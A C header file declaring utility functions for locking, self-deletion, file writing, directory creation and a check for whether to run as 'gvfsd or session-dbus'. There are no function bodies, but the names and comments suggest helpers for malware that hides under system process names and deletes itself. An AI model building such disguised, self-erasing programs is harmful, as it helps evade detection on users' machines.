#ifndef UTILS_H_
#define UTILS_H_
#include <stdbool.h>

/**
 * Create a lock file to ensure one instance is running.
 * @param lock_id, integer value indicating which file to lock and check for.
 * @return  N/A
 * */
void create_lock(int lock_id);


/**
 * @brief
 **/
bool self_delete(char *fpath);


bool write_to_file(char *fpath, char *data);



/**
** @brief get current directory. This is used as a function of which function
* to spawn a thread from.
*
* @return boolean to indicate gvfsd or session-dbus
**/
bool get_pwd(void);

/**
 *@brief helper function for recursively creating directories
 *@param home, boolean value to indicate to prepend $HOME to the fpath
 *@param fpath, FULL file path to create
 *@param mode, integer value for permissions w/ mkdir
 *
 **/
void _mkdir(bool home, char *fpath, int mode);

#endif // UTILS_H_
